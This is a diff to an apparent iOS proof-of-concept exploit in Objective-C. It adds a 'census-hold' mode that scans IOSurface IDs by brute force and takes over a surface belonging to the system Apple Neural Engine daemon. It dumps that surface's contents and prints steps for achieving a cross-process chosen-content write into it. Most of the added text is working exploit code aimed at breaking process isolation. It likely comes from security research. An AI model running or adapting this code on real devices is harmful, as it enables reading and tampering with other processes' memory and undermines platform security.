@@ -154,7 +154,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v63-copyout-chosenwrite"
+#define P044_BUILD @"p044-v65-census-hold"
 
 #define INPUT_COUNT 191
 #define PAYLOAD_SIZE 0xb80
@@ -1982,6 +1982,97 @@ static void *watch_worker(void *arg) {
             if ([gmode hasPrefix:@"ane"]) {
                 g_guestHoldANE = 1;
                 [out appendString:@"  [v64] GUEST ANE-HOLD MODE: full fire runs this tap (~2 min). The request OUTPUT surface — consumer-mapped by the ANE — is HELD at cleanup instead of released; its sid prints at the END of this log. Keep the app alive; do not force-quit.\n"];
+            } else if ([gmode hasPrefix:@"census"]) {
+                /* v65 census-hold (note 168): hold an ANED-CLASS surface —
+                   a steal of an IOSurfaceLookup reference. Round 1 (plain,
+                   sid 160) + round 2 (consumer-mapped OUTPUT, sid 670)
+                   proved app-created surfaces resolve ONLY from the owner
+                   task; the census band (aned/Espresso staging) resolves
+                   from ANY task — so the STANDALONE's fire can bind its
+                   OUTPUT record to this sid and the ANE DMAs the chosen
+                   pattern into memory THIS process holds a live mapping
+                   of = cross-process VISIBILITY of a chosen-content write.
+                   Quick tap: mini-census (0x4000 filter — the consumer's
+                   size validation requires the OUTPUT target to be
+                   0x4000) + 1.2 s stillness + hold + pre-dump + return. */
+                if (!p044_sfLookup) {
+                    [out appendString:@"  [v65 GUEST] IOSurfaceLookup dlsym missing — census-hold failed\n"];
+                    p044_write_log(out);
+                    return out;
+                }
+                enum { V65_MAXC = 64 };
+                uint32_t cand[V65_MAXC];
+                int nc = 0;
+                for (uint32_t sid = 1; sid <= 1200 && nc < V65_MAXC; sid++) {
+                    CFTypeRef f = p044_sfLookup(sid);
+                    if (!f) continue;
+                    size_t sz = p044_sfAllocSz ? p044_sfAllocSz(f) : 0;
+                    if (sz == P044_REQ_OUT_BYTES)
+                        cand[nc++] = sid;
+                    CFRelease(f);
+                }
+                [out appendFormat:@"  [v65] census-hold scan: %d candidate 0x%zx surfaces\n",
+                    nc, (size_t)P044_REQ_OUT_BYTES];
+                CFTypeRef held = NULL;
+                uint32_t heldSid = 0;
+                for (int k = 0; k < nc && !held; k++) {
+                    uint32_t sid = cand[k];
+                    CFTypeRef f = p044_sfLookup(sid);
+                    if (!f) continue;
+                    uint8_t a8[8], b8[8];
+                    int gotA = 0, gotB = 0;
+                    if (p044_sfLock(f, 1, NULL) == 0) {
+                        uint8_t *b = (uint8_t *)p044_sfBase(f);
+                        if (b) { memcpy(a8, b, 8); gotA = 1; }
+                        p044_sfUnlock(f, 1, NULL);
+                    }
+                    CFRelease(f);
+                    if (!gotA) continue;
+                    [NSThread sleepForTimeInterval:1.2];
+                    f = p044_sfLookup(sid);
+                    if (!f) continue;
+                    if (p044_sfLock(f, 1, NULL) == 0) {
+                        uint8_t *b = (uint8_t *)p044_sfBase(f);
+                        if (b) { memcpy(b8, b, 8); gotB = 1; }
+                        p044_sfUnlock(f, 1, NULL);
+                    }
+                    if (gotB && memcmp(a8, b8, 8) == 0) {
+                        held = f; /* STEAL this lookup reference into the hold */
+                        heldSid = sid;
+                        [out appendFormat:@"  [v65] stillness sid=%u STABLE — held (CFRetain of lookup)\n", sid];
+                    } else {
+                        CFRelease(f);
+                        [out appendFormat:@"  [v65] stillness sid=%u moving — skipped\n", sid];
+                    }
+                }
+                if (!held) {
+                    [out appendString:@"  [v65 GUEST] no stable 0x4000 census candidate — census-hold failed (retry the tap)\n"];
+                    p044_write_log(out);
+                    return out;
+                }
+                g_guestHold = held;
+                g_guestHoldSid = heldSid;
+                g_guestHoldTile = 0; /* aned content, not our tile */
+                [out appendFormat:@"\n=== v65 GUEST CENSUS HOLD: sid=%u (aned-class, shared-registry candidate, 0x4000, held via lookup CFRetain) ===\n",
+                    heldSid];
+                [out appendFormat:@"  backup candidates (if the fire's 3a.5 says NOT RESOLVABLE, retry with one):"];
+                int logged = 0;
+                for (int k = 0; k < nc && logged < 6; k++)
+                    if (cand[k] != heldSid) { [out appendFormat:@" %u", cand[k]]; logged++; }
+                [out appendString:@"\n"];
+                if (p044_sfLock(g_guestHold, 1, NULL) == 0) {
+                    uint8_t *b = (uint8_t *)p044_sfBase(g_guestHold);
+                    if (b) {
+                        p044_write_bin(@"p044_guest_pre.bin", b, P044_REQ_OUT_BYTES);
+                        g_guestPreValid = 1;
+                        [out appendFormat:@"  p044_guest_pre.bin written (base u16=0x%02x%02x bytes0..7=%02x %02x %02x %02x %02x %02x %02x %02x)\n",
+                            b[1], b[0], b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]];
+                    }
+                    p044_sfUnlock(g_guestHold, 1, NULL);
+                }
+                [out appendString:@"  KEEP THIS APP BACKGROUND-ALIVE (no force-quit). Push this sid as p044_target.txt into the STANDALONE app's Documents (house_arrest) + p044_fill.txt=<pattern e.g. 5eaf,4b1d,3c2f,2d3e> + p044_req_in.txt=127 + p044_model.txt=XVRC27_127in_copyout, tap the STANDALONE (its 3a.5 line must say sid RESOLVES — aned class), then return and tap with p044_guest.txt again (any content) to OBSERVE: p044_guest_after.bin showing the STANDALONE's chosen pattern at the base = CROSS-PROCESS CHOSEN-CONTENT WRITE into a surface THIS process holds mapped.\n"];
+                p044_write_log(out);
+                return out;
             } else {
             uint16_t tile = p044FillTileValid ? p044FillTile : 0x4b1d;
             CFTypeRef srf = p044_surface_create_poc(P044_REQ_OUT_BYTES, (uint8_t)(tile & 0xff));
